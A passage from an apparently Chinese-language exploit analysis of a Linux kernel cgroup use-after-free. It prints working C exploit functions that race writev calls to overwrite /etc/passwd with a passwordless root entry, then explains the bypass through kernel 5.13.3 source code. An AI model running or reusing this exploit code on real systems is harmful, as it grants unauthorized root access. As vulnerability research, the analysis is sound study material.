2px;"><p>栈大小限制（RLIMIT_STACK）：限制了进程的栈大小为 1MB。</p></li><li style="margin-left: 2px;"><p>核心文件大小限制（RLIMIT_CORE）：禁止了进程生成核心转储文件。</p></li><li style="margin-left: 2px;"><p>打开文件描述符数量限制（RLIMIT_NOFILE）：限制了进程可以打开的文件描述符数量为 256。</p></li></ul><p>然后挂载创建一个新的命名空间，将当前命名空间的根文件系统挂载点设置为私有，再创建其它的一系列的命名空间。</p><p>随后写这些内核参数文件，这样就创建了一个合适的环境。</p><h4>loop</h4><h5>trigger</h5><p><code style="font-family: SFMono-Regular, Consolas, ;">fsopen</code> 打开一个文件系统 <code style="font-family: SFMono-Regular, Consolas, ;">cgroup</code>，将 <code style="font-family: SFMono-Regular, Consolas, ;">./uaf</code> 链接到 <code style="font-family: SFMono-Regular, Consolas, ;">./data</code> 上，又使用 <code style="font-family: SFMono-Regular, Consolas, ;">fsconfig</code> 进行了一些配置，在这个地方已经产生了 UAF 漏洞。</p><p>然后开启了两个线程分别启动 <code style="font-family: SFMono-Regular, Consolas, ;">slow_write</code> 和 <code style="font-family: SFMono-Regular, Consolas, ;">write_cmd</code>，主线程调用 <code style="font-family: SFMono-Regular, Consolas, ;">spray_files</code>。分别对应论文第一张图的线程 1，2，3。</p><p>那么可以发现，主要就是由这三个线程去操作了，之前一系列是为了进行一个环境配置在造成 UAF，因为并没有权限直接更改内核的某些参数，所以直接创建新的命名空间去操作的。</p><h5>slow_write</h5><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">void</span> *<span style="color: rgb(255, 255, 182);">slow_write</span>() {<br />    printf(<span style="color: rgb(168, 255, 96);">"start slow write to get the lock\n"</span>);    <span style="color: rgb(255, 255, 182);">int</span> fd = open(<span style="color: rgb(168, 255, 96);">"./uaf"</span>, <span style="color: rgb(255, 115, 253);">1</span>);<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (fd &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />        perror(<span style="color: rgb(168, 255, 96);">"error open uaf file"</span>);<br />        exit(<span style="color: rgb(255, 115, 253);">-1</span>);<br />    }<br /><br />    <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(255, 255, 182);">int</span> addr = <span style="color: rgb(255, 115, 253);">0x30000000</span>;<br />    <span style="color: rgb(255, 255, 182);">int</span> offset;<br />    <span style="color: rgb(150, 203, 254);">for</span> (offset = <span style="color: rgb(255, 115, 253);">0</span>; offset &lt; <span style="color: rgb(255, 115, 253);">0x80000</span>; offset++) {<br />        <span style="color: rgb(255, 255, 182);">void</span> *r = mmap((<span style="color: rgb(255, 255, 182);">void</span> *)(addr + offset * <span style="color: rgb(255, 115, 253);">0x1000</span>), <span style="color: rgb(255, 115, 253);">0x1000</span>,<br />                       PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(255, 115, 253);">0</span>);<br />        <span style="color: rgb(150, 203, 254);">if</span> (r &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />            printf(<span style="color: rgb(168, 255, 96);">"allocate failed at 0x%x\n"</span>, offset);<br />        }<br />    }<br /><br />    assert(offset &gt; <span style="color: rgb(255, 115, 253);">0</span>);<br /><br />    <span style="color: rgb(255, 255, 182);">void</span> *mem = (<span style="color: rgb(255, 255, 182);">void</span> *)(addr);<br />    memcpy(mem, <span style="color: rgb(168, 255, 96);">"hhhhh"</span>, <span style="color: rgb(255, 115, 253);">5</span>);<br /><br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">iovec</span> iov[<span style="color: rgb(255, 115, 253);">5</span>];<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; <span style="color: rgb(255, 115, 253);">5</span>; i++) {<br />        iov[i].iov_base = mem;<br />        iov[i].iov_len = (offset - <span style="color: rgb(255, 115, 253);">1</span>) * <span style="color: rgb(255, 115, 253);">0x1000</span>;<br />    }<br /><br />    run_write = <span style="color: rgb(255, 115, 253);">1</span>;<br />    <span style="color: rgb(150, 203, 254);">if</span> (writev(fd, iov, <span style="color: rgb(255, 115, 253);">5</span>) &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />        perror(<span style="color: rgb(168, 255, 96);">"slow write"</span>);<br />    }<br />    printf(<span style="color: rgb(168, 255, 96);">"write done!\n"</span>);}</code></pre><p>打开文件去占据内核锁，去打开 <code style="font-family: SFMono-Regular, Consolas, ;">./uaf</code>，至于为什么打开 uaf，稍后分析内核源码可以获得具体原因。</p><p>这里面还分配了大量内存页，并尝试将所有页面写入文件，这一步通过文献的查阅可以得知是为了减缓写文件的速度，把写文件的时间线拉长就可以提高漏洞利用的成功率。</p><p>中间在开始写之前会设置一个全局变量去启动下一个线程。</p><h4>write_cmd</h4><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">void</span> *<span style="color: rgb(255, 255, 182);">write_cmd</span>() {<br />    <span style="color: rgb(255, 255, 182);">char</span> data[<span style="color: rgb(255, 115, 253);">1024</span>] = <span style="color: rgb(168, 255, 96);">"root::0:0:root:/root:/bin/sh\n\n"</span>;<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">iovec</span> iov = {.iov_base = data, .iov_len = strlen(data)};<br /><br />    <span style="color: rgb(150, 203, 254);">while</span> (!run_write) {<br />    }<br />    run_spray = <span style="color: rgb(255, 115, 253);">1</span>;<br />    <span style="color: rgb(150, 203, 254);">if</span> (writev(uaf_fd, &amp;iov, <span style="color: rgb(255, 115, 253);">1</span>) &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />        printf(<span style="color: rgb(168, 255, 96);">"failed to write\n"</span>);<br />    }<br />    printf(<span style="color: rgb(168, 255, 96);">"overwrite done! It should be after the slow write\n"</span>);}</code></pre><p>这一步就是等到第一个线程调用 <code style="font-family: SFMono-Regular, Consolas, ;">writev</code> 的时候启动第三个线程，然后再去写指定的数据。</p><h4>spray_files</h4><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">int</span> spray_files() {<br /><br />    <span style="color: rgb(150, 203, 254);">while</span> (!run_spray) {<br />    }<br />    <span style="color: rgb(150, 203, 254);">int</span> found = <span style="color: rgb(255, 115, 253);">0</span>;<br /><br />    <span style="color: rgb(150, 203, 254);">printf</span>(<span style="color: rgb(168, 255, 96);">"got uaf fd %d, start spray....\n"</span>, uaf_fd);    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; MAX_FILE_NUM; i++) {<br />        fds[i] = <span style="color: rgb(150, 203, 254);">open</span>(<span style="color: rgb(168, 255, 96);">"/etc/passwd"</span>, O_RDONLY);<br />        <span style="color: rgb(150, 203, 254);">if</span> (fds[i] &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />            perror(<span style="color: rgb(168, 255, 96);">"open file"</span>);<br />            <span style="color: rgb(150, 203, 254);">printf</span>(<span style="color: rgb(168, 255, 96);">"%d\n"</span>, i);<br />        }<br />        <span style="color: rgb(150, 203, 254);">if</span> (<span style="color: rgb(150, 203, 254);">syscall</span>(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, fds[i]) ==<br />            <span style="color: rgb(255, 115, 253);">0</span>) {<br />            found = <span style="color: rgb(255, 115, 253);">1</span>;<br />            <span style="color: rgb(150, 203, 254);">printf</span>(<span style="color: rgb(168, 255, 96);">"[!] found, file id %d\n"</span>, i);<br />            <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">int</span> j = <span style="color: rgb(255, 115, 253);">0</span>; j &lt; i; j++)<br />                <span style="color: rgb(150, 203, 254);">close</span>(fds[j]);<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        }<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (found) {<br />        <span style="color: rgb(150, 203, 254);">sleep</span>(<span style="color: rgb(255, 115, 253);">4</span>);<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> -<span style="color: rgb(255, 115, 253);">1</span>;<br />}</code></pre><p>连续地打开 <code style="font-family: SFMono-Regular, Consolas, ;">/etc/passwd</code> 文件，判断文件描述符和 <code style="font-family: SFMono-Regular, Consolas, ;">uaf_fd</code> 是否为同一文件，如果是那么设置 <code style="font-family: SFMono-Regular, Consolas, ;">found=1</code>。</p><p>在这个地方触发了漏洞导致了 uaf 文件描述符写入了 <code style="font-family: SFMono-Regular, Consolas, ;">/etc/passwd</code> 文件。</p><h2>源码分析</h2><p>选用对应源码版本：https://elixir.bootlin.com/linux/v5.13.3/source</p><h3>open</h3><p>在利用中线程 1 （局部变量 <code style="font-family: SFMono-Regular, Consolas, ;">fd</code>）和线程 2 （全局变量 <code style="font-family: SFMono-Regular, Consolas, ;">uaf_fd</code>）都打开了一个文件（<code style="font-family: SFMono-Regular, Consolas, ;">./uaf</code>），如果 <code style="font-family: SFMono-Regular, Consolas, ;">uaf</code> 是普通文件，那么 <code style="font-family: SFMono-Regular, Consolas, ;">FMODE_ATOMIC_POS</code> 这个标志位必定存在，但是如果是链接文件，则这里不会被设置这个标记，可以避免被卡在这个函数。</p><p>具体的代码可以查看 <code style="font-family: SFMono-Regular, Consolas, ;">open</code> 函数的调用，相关解释已加注释。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">static</span> int <span style="color: rgb(255, 255, 182);">do_dentry_open</span>(<span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span> *f,<br />                          <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">inode</span> *inode,<br />                          <span style="color: rgb(255, 255, 182);">int</span> (*open)(<span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">inode</span> *, <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span> *))<br />{<br />    <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file_operations</span> empty_fops = {};<br />    int error;<br /><br />    <span style="color: rgb(255, 255, 182);">path_get</span>(&amp;f-&gt;f_path);<br />    f-&gt;f_inode = inode;<br />    f-&gt;f_mapping = inode-&gt;i_mapping;<br />    f-&gt;f_wb_err = <span style="color: rgb(255, 255, 182);">filemap_sample_wb_err</span>(f-&gt;f_mapping);<br />    f-&gt;f_sb_err = <span style="color: rgb(255, 255, 182);">file_sample_sb_err</span>(f);<br /><br />    <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">unlikely</span>(f-&gt;f_flags &amp; O_PATH)) {<br />        f-&gt;f_mode = FMODE_PATH | FMODE_OPENED;<br />        f-&gt;f_op = &amp;empty_fops;<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />    }<br /><br />    <span style="color: rgb(255, 255, 182);">if</span> (f-&gt;f_mode &amp; FMODE_WRITE &amp;&amp; !<span style="color: rgb(255, 255, 182);">special_file</span>(inode-&gt;i_mode)) {<br />        error = <span style="color: rgb(255, 255, 182);">get_write_access</span>(inode);<br />        <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">unlikely</span>(error))<br />            goto cleanup_file;<br />        error = __mnt_want_write(f-&gt;f_path.mnt);<br />        <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">unlikely</span>(error)) {<br />            <span style="color: rgb(255, 255, 182);">put_write_access</span>(inode);<br />            goto cleanup_file;<br />        }<br />        f-&gt;f_mode |= FMODE_WRITER;<br />    }<br /><br />    <span style="color: rgb(124, 124, 124);">/* POSIX.1-2008/SUSv4 Section XSI 2.9.7 */</span><br />    <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">S_ISREG</span>(inode-&gt;i_mode) || <span style="color: rgb(255, 255, 182);">S_ISDIR</span>(inode-&gt;i_mode))<br />        f-&gt;f_mode |= FMODE_ATOMIC_POS;<br /><span style="color: rgb(124, 124, 124);">//这里可以看到，如果打开的文件是目录（DIR）类型或者是常规（REG）类型的文件，则必定加上一个 FMODE_ATOMIC_POS 标记，因此需要通过建立链接来绕过</span><br />    f-&gt;f_op = <span style="color: rgb(255, 255, 182);">fops_get</span>(inode-&gt;i_fop);<br />    <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">WARN_ON</span>(!f-&gt;f_op)) {<br />        error = -ENODEV;<br />        goto cleanup_all;<br />    }<br /><span style="color: rgb(124, 124, 124);">//...这里省略了很多代码</span><br />cleanup_all:<br />    <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">WARN_ON_ONCE</span>(error &gt; <span style="color: rgb(255, 115, 253);">0</span>))<br />        error = -EINVAL;<br />    <span style="color: rgb(255, 255, 182);">fops_put</span>(f-&gt;f_op);<br />    <span style="color: rgb(255, 255, 182);">if</span> (f-&gt;f_mode &amp; FMODE_WRITER) {<br />        <span style="color: rgb(255, 255, 182);">put_write_access</span>(inode);<br />        __mnt_drop_write(f-&gt;f_path.mnt);<br />    }<br />cleanup_file:<br />    <span style="color: rgb(255, 255, 182);">path_put</span>(&amp;f-&gt;f_path);<br />    f-&gt;f_path.mnt = NULL;<br />    f-&gt;f_path.dentry = NULL;<br />    f-&gt;f_inode = NULL;<br />    <span style="color: rgb(150, 203, 254);">return</span> error;<br />}</code></pre><h3>writev</h3><p>主要要分析的是 <code style="font-family: SFMono-Regular, Consolas, ;">sys_writev</code>。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">SYSCALL_DEFINE3(writev, <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span>, fd, <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(150, 203, 254);">struct</span> iovec __user *, vec,<br />                <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span>, vlen)<br />{<br />    <span style="color: rgb(150, 203, 254);">return</span> do_writev(fd, vec, vlen, <span style="color: rgb(255, 115, 253);">0</span>);<br />}</code></pre><p>深入这个函数来看看</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">ssize_t</span> <span style="color: rgb(255, 255, 182);">do_writev</span>(<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> fd, <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(150, 203, 254);">struct</span> iovec __user *vec,<br />                         <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> vlen, <span style="color: rgb(255, 255, 182);">rwf_t</span> flags)<br />{<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fd</span> f = fdget_pos(fd);<br />    <span style="color: rgb(255, 255, 182);">ssize_t</span> ret = -EBADF;<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (f.file) {<br />        <span style="color: rgb(255, 255, 182);">loff_t</span> pos, *ppos = file_ppos(f.file);<br />        <span style="color: rgb(150, 203, 254);">if</span> (ppos) {<br />            pos = *ppos;<br />            ppos = &amp;pos;<br />        }<br />        ret = vfs_writev(f.file, vec, vlen, ppos, flags);<br />        <span style="color: rgb(150, 203, 254);">if</span> (ret &gt;= <span style="color: rgb(255, 115, 253);">0</span> &amp;&amp; ppos)<br />            f.file-&gt;f_pos = pos;<br />        fdput_pos(f);<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (ret &gt; <span style="color: rgb(255, 115, 253);">0</span>)<br />        add_wchar(current, ret);<br />    inc_syscw(current);<br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}</code></pre><p>看起来其实非常简单，也就是先根据文件描述符去获取 fd 结构，fd 结构里面维护了当前打开的文件的写指针和读指针，第一步先获取，然后调用 <code style="font-family: SFMono-Regular, Consolas, ;">vfs_writev</code> 去写该文件，随后释放文件结构，如果返回值 &gt;0，则增加当前文件写入字符数（<code style="font-family: SFMono-Regular, Consolas, ;">add_wchar</code>），增加当前系统调用次数（<code style="font-family: SFMono-Regular, Consolas, ;">inc_syscw</code>）</p><p>同样从头到尾来看看函数定义，首先是这个获取文件结构的 <code style="font-family: SFMono-Regular, Consolas, ;">fdget_pos</code>，</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(150, 203, 254);">inline</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fd</span> fdget_pos(<span style="color: rgb(255, 255, 182);">int</span> fd)<br />{<br />    <span style="color: rgb(150, 203, 254);">return</span> __to_fd(__fdget_pos(fd));<br />}</code></pre><p>然后再深入看看 <code style="font-family: SFMono-Regular, Consolas, ;">__to_fd</code> 和 <code style="font-family: SFMono-Regular, Consolas, ;">__fget_pos</code> 函数。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(150, 203, 254);">inline</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fd</span> __to_fd(<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> v)<br />{<br />    <span style="color: rgb(150, 203, 254);">return</span> (<span style="color: rgb(150, 203, 254);">struct</span> fd){(<span style="color: rgb(150, 203, 254);">struct</span> file *)(v &amp; ~<span style="color: rgb(255, 115, 253);">3</span>),v &amp; <span style="color: rgb(255, 115, 253);">3</span>};<br />}</code></pre><p>无疑 <code style="font-family: SFMono-Regular, Consolas, ;">__to_fd</code> 函数将获得的文件结构 <code style="font-family: SFMono-Regular, Consolas, ;">struct file</code> 转为 <code style="font-family: SFMono-Regular, Consolas, ;">struct fd</code>。</p><p><code style="font-family: SFMono-Regular, Consolas, ;">__fdget_pos</code> 就应当是根据文件描述符来获取文件结构 <code style="font-family: SFMono-Regular, Consolas, ;">struct file</code>。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> __fdget_pos(<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> fd)<br />{<br />    <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> v = __fdget(fd);<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span> *file = (<span style="color: rgb(150, 203, 254);">struct</span> file *)(v &amp; ~<span style="color: rgb(255, 115, 253);">3</span>);<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (file &amp;&amp; (file-&gt;f_mode &amp; FMODE_ATOMIC_POS)) {<br />        <span style="color: rgb(150, 203, 254);">if</span> (file_count(file) &gt; <span style="color: rgb(255, 115, 253);">1</span>) {<br />            v |= FDPUT_POS_UNLOCK;<br />            mutex_lock(&amp;file-&gt;f_pos_lock);<br />        }<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> v;<br />}</code></pre><p>深入下去 <code style="font-family: SFMono-Regular, Consolas, ;">__fdget</code> 可以发现里面调用了 <code style="font-family: SFMono-Regular, Consolas, ;">__fget_light</code>，第二个参数被固定为 <code style="font-family: SFMono-Regular, Consolas, ;">FMODE_PATH</code>，对于这个函数定义：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">/* File is opened with O_PATH; almost nothing can be done with it */</span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">define</span> FMODE_PATH                ((__force fmode_t)0x4000)</span><br /><span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> __fdget(<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> fd)<br />{<br />        <span style="color: rgb(150, 203, 254);">return</span> __fget_light(fd, FMODE_PATH);<br />}<br /><span style="color: rgb(124, 124, 124);">/*<br /> * Lightweight file lookup - no refcnt increment if fd table isn't shared.<br /> *<br /> * You can use this instead of fget if you satisfy all of the following<br /> * conditions:<br /> * 1) You must call fput_light before exiting the syscall and returning control<br /> *    to userspace (i.e. you cannot remember the returned struct file * after<br /> *    returning to userspace).<br /> * 2) You must not call filp_close on the returned struct file * in between<br /> *    calls to fget_light and fput_light.<br /> * 3) You must not clone the current task in between the calls to fget_light<br /> *    and fput_light.<br /> *<br /> * The fput_needed flag returned by fget_light should be passed to the<br /> * corresponding fput_light.<br /> */</span><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> __fget_light(<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> fd, <span style="color: rgb(255, 255, 182);">fmode_t</span> mask)<br />{<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">files_struct</span> *files = current-&gt;files;<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span> *file;<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (atomic_read(&amp;files-&gt;count) == <span style="color: rgb(255, 115, 253);">1</span>) {<br />        file = files_lookup_fd_raw(files, fd);<br />        <span style="color: rgb(150, 203, 254);">if</span> (!file || unlikely(file-&gt;f_mode &amp; mask))<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />        <span style="color: rgb(150, 203, 254);">return</span> (<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span>)file;<br />    } <span style="color: rgb(150, 203, 254);">else</span> {<br />        file = __fget(fd, mask, <span style="color: rgb(255, 115, 253);">1</span>);<br />        <span style="color: rgb(150, 203, 254);">if</span> (!file)<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />        <span style="color: rgb(150, 203, 254);">return</span> FDPUT_FPUT | (<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span>)file;<br />    }<br />}<br /></code></pre><p>这里也解释了这个宏的定义，表示文件几乎不能做任何操作比如说 <code style="font-family: SFMono-Regular, Consolas, ;">READ,WRITE</code>，而这里的 <code style="font-family: SFMono-Regular, Consolas, ;">mask</code> 在后面分析是禁止的一些操作，比如文件具有 <code style="font-family: SFMono-Regular, Consolas, ;">READ</code> 权限但是 <code style="font-family: SFMono-Regular, Consolas, ;">mask</code> 被设置为 <code style="font-family: SFMono-Regular, Consolas, ;">FMODE_READ</code>，那么在后续的调用中会返回 <code style="font-family: SFMono-Regular, Consolas, ;">NULL</code>。</p><p>先获取当前进程的文件描述符表（<code style="font-family: SFMono-Regular, Consolas, ;">current-&gt;files</code>），然后判断文件描述符表的引用计数是否为 <code style="font-family: SFMono-Regular, Consolas, ;">1</code> （描述符表是否共享），如果是则调用 <code style="font-family: SFMono-Regular, Consolas, ;">files_lookup_fd_raw</code> 去获取文件结构指针，然后判断文件操作模式的正确性，随后返回。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">/*<br /> * The caller must ensure that fd table isn't shared or hold rcu or file lock<br /> */</span><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(150, 203, 254);">inline</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span> *files_lookup_fd_raw(<span style="color: rgb(150, 203, 254);">struct</span> files_struct *files, <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> fd)<br />{<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fdtable</span> *fdt = rcu_dereference_raw(files-&gt;fdt);<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (fd &lt; fdt-&gt;max_fds) {<br />        fd = array_index_nospec(fd, fdt-&gt;max_fds);<br />        <span style="color: rgb(150, 203, 254);">return</span> rcu_dereference_raw(fdt-&gt;fd[fd]);<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">NULL</span>;<br />}</code></pre><p>根据注释也可以认为，需要保证文件描述符表没有被共享过，或者是持有文件锁。会返回一个 <code style="font-family: SFMono-Regular, Consolas, ;">fd</code> 表中的 <code style="font-family: 